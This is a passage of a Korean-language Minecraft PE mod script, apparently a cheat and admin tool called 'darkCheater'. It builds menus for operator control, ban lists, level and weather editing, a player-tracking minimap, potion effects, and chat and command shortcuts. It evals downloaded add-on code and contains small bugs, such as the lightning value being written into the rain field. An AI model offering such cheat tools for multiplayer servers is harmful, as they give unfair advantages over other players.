checks[n].setText(cmds[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setChecked(opData[nn][n]);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
opData[nn][check.getId()] = onoff;
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("OP 관리 - "+Player.getName(ops[nn]));
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function fireEditor(tf){
if(Dark.readAddOn("fireEditor")!="")
eval(Dark.readAddOn("fireEditor"));
else if(tf)
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function openMineDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
players.sort();
}
var checks = [];
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(Player.getName(players[n]));
checks[n].setId(n);
checks[n].setTextColor(white);
if(antiMine.indexOf(players[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
antiMine.push(players[check.getId()]);
}
else if(onoff==false){
antiMine.splice(antiMine.indexOf(players[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("블록 파괴 금지 대상자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openBlackList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var list = new android.widget.EditText(ctx);
list.setHint("닉네임을 입력하세요...");
list.setText(blackList);
list.setTextColor(white);
layout.addView(list);
Dark.noFullScreen(list);
var pl = new android.widget.Button(ctx);
pl.setText("접속중인 플레이어 목록에서 가져오기");
pl.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
playerList(list);
}
});
layout.addView(pl);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("블랙 리스트 - 닉네임 밴");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
blackList = list.getText().toString();
if(list.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/blackList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("blackList", blackList);
}
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function playerList(list, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var player;
var players = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
players.sort();
}
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = [];
for(var n in players){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(Player.getName(players[n]));
radio[n].setId(n);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
player = players[checkedId];
}
}));
layout.addView(radios);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("플레이어 목록");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(tf){
if(list.getText()=="") list.setText(Player.getName(player)+"::"+player);
else list.setText(list.getText()+"\n"+Player.getName(player)+"::"+player);
}
else{
if(list.getText()=="") list.setText(Player.getName(player)+"");
else list.setText(list.getText()+"\n"+Player.getName(player));
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function inputLevelAndExp(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setTextColor(white);
loc2.setTextColor(white);
loc1.setText("레벨 : ");
loc1.setTextSize(18);
loc2.setHint("레벨을 입력하세요...");
loc2.setText(Player.getLevel()+"");
loc2.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setTextColor(white);
loc4.setTextColor(white);
loc3.setText("경험치 : ");
loc3.setTextSize(18);
loc4.setHint("경험치를 입력하세요...");
loc4.setText(Player.getExp()+"");
loc4.setInputType(number|number3);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("레벨/경험치 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Player.setLevel(loc2.getText());
Player.setExp(loc4.getText());
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function weatherSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("비 강도 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("비 강도를 입력하세요...");
loc2.setText(Level.getRainLevel()+"");
loc2.setTextColor(white);
loc2.setInputType(number|number3);
loc3.setText("번개 강도 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("번개 강도를 입력하세요...");
loc2.setText(Level.getLightningLevel()+"");
loc4.setTextColor(white);
loc4.setInputType(number|number3);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("날씨 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Level.setRainLevel(loc2.getText());
Level.setLightningLevel(loc4.getText());
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectColor(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var na = new android.widget.CheckBox(ctx);
na.setText("불투명하게 설정");
if(Dark.read("alpha")=="true") na.setChecked(true);
else na.setChecked(false);
na.setTextColor(white);
na.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
Dark.save("alpha", onoff);
}
}));
layout.addView(na);
//--
if(Dark.read("colorData")=="") var rgb = [0, 0, 0];
else var rgb = Dark.read("colorData").toString().split(",");
var txt = new android.widget.TextView(ctx);
txt.setText("\n미리보기");
txt.setTextSize(23);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
txt.setGravity(center);
var r1 = new android.widget.TextView(ctx);
r1.setText("R : "+rgb[0]);
r1.setTextSize(18);
r1.setTextColor(white);
var r2 = new android.widget.SeekBar(ctx);
r2.setMax(255);
r2.setProgress(rgb[0]);
r2.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
rgb[0] = seek.getProgress();
r1.setText("R : "+rgb[0]);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
}
}));
var g1 = new android.widget.TextView(ctx);
g1.setText("G : "+rgb[1]);
g1.setTextSize(18);
g1.setTextColor(white);
var g2 = new android.widget.SeekBar(ctx);
g2.setMax(255);
g2.setProgress(rgb[1]);
g2.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
rgb[1] = seek.getProgress();
g1.setText("G : "+rgb[1]);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
}
}));
var b1 = new android.widget.TextView(ctx);
b1.setText("B : "+rgb[2]);
b1.setTextSize(18);
b1.setTextColor(white);
var b2 = new android.widget.SeekBar(ctx);
b2.setMax(255);
b2.setProgress(rgb[2]);
b2.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
rgb[2] = seek.getProgress();
b1.setText("B : "+rgb[2]);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
}
}));
//--
var type = null;
var types = ["검정(기본)", "하양", "빨강", "초록", "파랑", "노랑", "청록", "보라", "직접 입력"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
type = p;
try{
if(p==8){
layout.addView(txt);
layout.addView(r1);
layout.addView(r2);
layout.addView(g1);
layout.addView(g2);
layout.addView(b1);
layout.addView(b2);
}
else{
layout.removeView(txt);
layout.removeView(r1);
layout.removeView(r2);
layout.removeView(g1);
layout.removeView(g2);
layout.removeView(b1);
layout.removeView(b2);
}
}
catch(e){
return;
Dark.toast(e);
}
}
}));
layout.addView(spin);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("메뉴 색상 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.save("color", type);
if(type==8){
Dark.save("colorData", rgb[0]+","+rgb[1]+","+rgb[2]);
Dark.toast("R ; "+rgb[0]+", G ; "+rgb[1]+", B : "+rgb[2]+"(으)로 수정되었습니다.");
}
else{
Dark.toast(types[type]+"(으)로 수정되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeMiniMap(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
miniMap = new android.widget.PopupWindow();
var mapData = createMiniMap();
var back = new android.graphics.drawable.BitmapDrawable(mapData);
back.setAlpha(miniMapSet.alpha);
miniMapData.setBackgroundDrawable(back);
miniMapData.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
miniMapSettings();
}
}));
setDragListener(miniMap, miniMapData, 0, true);
miniMap.setContentView(miniMapData);
miniMap.setWidth(dip2px(ctx, miniMapSet.size));
miniMap.setHeight(dip2px(ctx, miniMapSet.size));
miniMap.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(100, 120, 120, 120)));
miniMap.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, dip2px(ctx, 3), dip2px(ctx, 3));
miniMapTime = 11;
}
else{
if(miniMap!=null){
miniMap.dismiss();
miniMap = null;
}
miniMapTime = 0;
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function createMiniMap(){
try{
var mx, my, mz;
mx = Math.round(Player.getX()-0.5);
my = Player.getY()-2;
mz = Math.round(Player.getZ()-0.5);
var mapData = new android.graphics.Bitmap.createBitmap(2*miniMapSet.area*10, 2*miniMapSet.area*10, android.graphics.Bitmap.Config.ARGB_8888);
var canvas = new android.graphics.Canvas(mapData);
var p = new android.graphics.Paint();
for(var n=-miniMapSet.area;n<miniMapSet.area+1;n++){
for(var m=-miniMapSet.area;m<miniMapSet.area+1;m++){
for(var yy=my+2;yy>my-3;yy--){
var b = getTile(mx+n, yy, mz+m);
if(b!=0) break;
}
if(b==0) p.setARGB(0, 0, 0, 0);
else if(b==2||b==253||b==31||b==175||b==37||b==38||b==39||b==40) p.setARGB(250, 0, 255, 45);
else if(b==3||b==243||b==159||b==172||b==60||b==248||b==249) p.setARGB(250, 153, 109, 0);
else if(b==1||(b>=13&&b<=16)||b==4||b==21||b==48||b==82||b==98||b==110||b==129||b==139||b==61||b==62||b==245||b==67||b==71||b==73||b==74||b==109||b==255||b==101) p.setARGB(250, 120, 120, 120);
else if(b==8||b==9||b==22) p.setARGB(250, 0, 0, 255);
else if(b==79||b==174||b==247) p.setARGB(250, 160, 180, 255);
else if(b==5||b==17||b==32||b==47||b==53||b==54||b==58||b==63||b==64||b==65||b==68||b==85||b==107||b==134||b==135||b==136||b==157||b==158||b==162||b==163||b==164||b==183||b==184||b==185||b==186||b==187||b==96) p.setARGB(250, 164, 135, 81);
else if(b==6||b==18||b==81||b==83||b==103||b==104||b==105||b==106||b==111||b==120||b==133||b==141||b==142||b==161||b==244||b==254) p.setARGB(250, 64, 148, 0);
else if(b==10||b==11||b==51||b==26||b==27||b==46||b==152||b==246) p.setARGB(250, 255, 0, 0);
else if(b==12||b==24||b==19||b==41||b==89||b==121||b==170||b==198) p.setARGB(250, 255, 255, 0);
else if(b==86||b==91||b==127) p.setARGB(250, 255, 180, 0);
else if(b==57) p.setARGB(250, 0, 255, 255);
else if(b==87) p.setARGB(250, 150, 0, 0);
else if(b==45) p.setARGB(250, 150, 80, 65);
else if(b==20||b==30||b==35||b==42||b==43||b==44||b==78||b==80||b==92||b==95||b==102||b==126||b==155||b==156||b==171||b==50) p.setARGB(250, 255, 255, 255);
else p.setARGB(250, 0, 0, 0);
canvas.drawRect((n+miniMapSet.area)*10, (m+miniMapSet.area)*10, (n+miniMapSet.area+1)*10, (m+miniMapSet.area+1)*10, p);
}}
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(250, 0, 0, 0);
canvas.drawText("●", miniMapSet.area*10, miniMapSet.area*10, p);
var players2 = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e)) players2.push(e);
}
var players = removeDouble(players2);
var px, pz;
for each(var pp in players){
px = Math.abs(mx-Entity.getX(pp));
pz = Math.abs(mz-Entity.getZ(pp));
if(px<=miniMapSet.area&&pz<=miniMapSet.area&&ad!=pp){
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(250, 255, 255, 255);
canvas.drawText("●", Math.round((mx-Entity.getX(pp))+miniMapSet.area)*10, Math.round((mz-Entity.getZ(pp))+miniMapSet.area)*10, p);
}
}
return mapData;
}
catch(e){
Dark.showError(e);
}
}


function miniMapSettings(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("범위 : " + miniMapSet.area);
txt1.setTextSize(18);
txt1.setTextColor(white);
layout.addView(txt1);
var se1 = new android.widget.SeekBar(ctx);
se1.setMax(10);
se1.setProgress(miniMapSet.area-5);
se1.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged: function(seek){
miniMapSet.area = seek.getProgress()+5;
txt1.setText("범위 : " + miniMapSet.area);
}
}));
layout.addView(se1);
var txt2 = new android.widget.TextView(ctx);
txt2.setText("크기 : " + miniMapSet.size);
txt2.setTextSize(18);
txt2.setTextColor(white);
layout.addView(txt2);
var se2 = new android.widget.SeekBar(ctx);
se2.setMax(100);
se2.setProgress(miniMapSet.size-50);
se2.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged: function(seek){
miniMapSet.size = seek.getProgress()+50;
txt2.setText("크기 : " + miniMapSet.size);
miniMap.update(dip2px(ctx, miniMapSet.size), dip2px(ctx, miniMapSet.size));
}
}));
layout.addView(se2);
var txt3 = new android.widget.TextView(ctx);
txt3.setText("불투명도 : " + miniMapSet.alpha);
txt3.setTextSize(18);
txt3.setTextColor(white);
layout.addView(txt3);
var se3 = new android.widget.SeekBar(ctx);
se3.setMax(245);
se3.setProgress(miniMapSet.alpha-10);
se3.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged: function(seek){
miniMapSet.alpha = seek.getProgress()+10;
txt3.setText("불투명도 : " + miniMapSet.alpha);
}
}));
layout.addView(se3);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("미니맵 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function giveEffectToEntity(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var type = null;
var names = ["포화", "흡수", "체력 신장", "위더", "독", "나약함", "허기", "야간투시", "실명", "투명화", "수중 호흡", "화염저항", "저항", "재생", "멀미", "점프 강화", "즉시 데미지", "즉시 회복", "힘", "피로", "성급함", "구속", "신속"];
var types = [MobEffect.saturation, MobEffect.absorption, MobEffect.healthBoost, MobEffect.wither, MobEffect.poison, MobEffect.weakness, MobEffect.hunger, MobEffect.nightVision, MobEffect.blindness, MobEffect.invisibility, MobEffect.waterBreathing, MobEffect.fireResistance, MobEffect.damageResistance, MobEffect.regeneration, MobEffect.confusion, MobEffect.jump, MobEffect.harm, MobEffect.heal, MobEffect.damageBoost, MobEffect.digSlowdown, MobEffect.digSpeed, MobEffect.movementSlowdown, MobEffect.movementSpeed];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, names);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p){
type = types[p];
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
var loc7 = new android.widget.TextView(ctx);
var loc8 = new android.widget.EditText(ctx);
loc1.setText("엔티티 타입 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("엔티티 타입 아이디를 입력하세요(생략시 전체)...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("범위 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("범위(반경)를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
loc5.setText("지속 시간 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("지속 시간을 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
loc7.setText("강도 : ");
loc7.setTextSize(18);
loc7.setTextColor(white);
loc8.setHint("강도를 입력하세요......");
loc8.setTextColor(white);
loc8.setInputType(number|number3);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
layout.addView(loc7);
layout.addView(loc8);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
Dark.noFullScreen(loc6);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 부여 (엔티티)");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var px, py, pz;
var r = loc4.getText();
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(ad)-Entity.getX(e));
py = Math.abs(Entity.getY(ad)-Entity.getY(e));
pz = Math.abs(Entity.getZ(ad)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&ad!=e){
if(loc2.getText().toString()==""&&!Player.isPlayer(e)&&Entity.getEntityTypeId(e)!=83){
try{
Entity.addEffect(e, type, 20*Number(loc6.getText()), Number(loc8.getText())-1, true, false);
}
catch(err){
//null;
}
Dark.toast("플레이어와 그림은 예외입니다.");
}
else if(Entity.getEntityTypeId(e)==loc2.getText()){
try{
Entity.addEffect(e, type, 20*Number(loc6.getText()), Number(loc8.getText())-1, true, false);
}
catch(err){
//null;
}
}
}
}
Dark.toast("포션 효과를 부여하였습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeCmdBtn(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
c.btn = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("cmd");
button.setTextSize(10);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
cmdList();
}
}));
setDragListener(c.btn, button, 0);
layout.addView(button);
c.btn.setContentView(layout);
c.btn.setWidth(dip2px(ctx, 45));
c.btn.setHeight(dip2px(ctx, 30));
c.btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
c.btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, dip2px(ctx, 32), dip2px(ctx, 70));
}
else{
if(c.btn!=null){
c.btn.dismiss();
c.btn = null;
}
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function cmdList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(Dark.read("cmdList")!="") var cmds = (Dark.read("cmdList")+"\n설정").split("\n");
else var cmds = ["설정"];
dialog.setItems(cmds, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(w==cmds.length-1){
cmdBtnOption();
}
else{
try{
if(c.mode) ScriptManager.nativeSendChat(cmds[w]);
else ScriptManager.callScriptMethod("procCmd", [cmds[w].substring(1, cmds[w].length.toString())]);
Dark.toast("명령어 \""+cmds[w]+"\"(을)를 사용하였습니다.");
}
catch(e){
clientMessage(e);
}
}
}
}));
dialog.setTitle("명령어 단축키 - 명령어 목록");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function cmdBtnOption(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var cmdType = 0;
var cmds = ["스크립트 명령어", "서버 명령어"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, cmds);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
cmdType = p;
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("명령어 목록 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("명령어를 입력하세요...");
loc2.setTextColor(white);
if(Dark.read("cmdList")!="") loc2.setText(Dark.read("cmdList")+"");
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(cmdType==0) c.mode = false;
if(cmdType==1) c.mode = true;
if(loc2.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/cmdList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("cmdList", loc2.getText().toString());
}
Dark.toast("저장되었습니다.");
}
}));
dialog.setTitle("명령어 단축키 - 설정");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeChatBtn(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
sBtn = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("chat");
button.setTextSize(10);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
chatList();
}
}));
setDragListener(sBtn, button, 0);
layout.addView(button);
sBtn.setContentView(layout);
sBtn.setWidth(dip2px(ctx, 45));
sBtn.setHeight(dip2px(ctx, 30));
sBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
sBtn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, dip2px(ctx, 82), dip2px(ctx, 70));
}
else{
if(sBtn!=null){
sBtn.dismiss();
sBtn = null;
}
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function chatList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(Dark.read("chatList")!="") var chats = (Dark.read("chatList")+"\n설정").split("\n");
else var chats = ["설정"];
dialog.setItems(chats, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(w==chats.length-1){
chatBtnOption();
}
else{
ScriptManager.nativeSendChat(chats[w]);
if(fixSendChat) clientMessage("<"+Player.getName(ad)+"> "+chats[w]);
Dark.toast("채팅을  보냈습니다("+chats[w]+").");
}
}
}));
dialog.setTitle("채팅 단축키 - 채팅 목록");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function chatBtnOption(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("채팅 목록 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("채팅을 입력하세요...");
loc2.setTextColor(white);
if(Dark.read("chatList")!="") loc2.setText(Dark.read("chatList")+"");
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(loc2.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/chatList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("chatList", loc2.getText().toString());
}
Dark.toast("저장되었습니다.");
}
}));
dialog.setTitle("채팅 단축키 - 설정");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function serverSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuS2 = new android.widget.PopupWindow();
var title = makeTitle("서버 관련", menuS2);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var menusT = ["PVP 방지", "서버원 공중부양 방지", "명령어 단축키", "채팅 단축키", "연속 채팅 방지", "서버원 접속 방지", "하이퍼 로그 사용", "The Seed", "서버장 사칭 방지", "서버 목록 숨기기", "이름표 숨기기", "이름표 옆에 채팅 표시"];
var btnT = [];
for(var n in menusT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menusT[n]);
}
btnT[0].setChecked(noPvp);
btnT[1].setChecked(f.tf);
if(c.btn==null) btnT[2].setChecked(false);
else btnT[2].setChecked(true);
if(sBtn==null) btnT[3].setChecked(false);
else btnT[3].setChecked(true);
btnT[4].setChecked(antiChat);
btnT[5].setChecked(noPlayer);
btnT[6].setChecked(hyperLogOn);
btnT[7].setChecked(theSeed);
btnT[8].setChecked(noAdmin);
var file = new java.io.File(sdcard+"/games/com.mojang/minecraftpe/external_servers.txt");
btnT[9].setChecked(!file.exists());
btnT[10].setChecked(hideNickNames);
btnT[11].setChecked(nameChat);
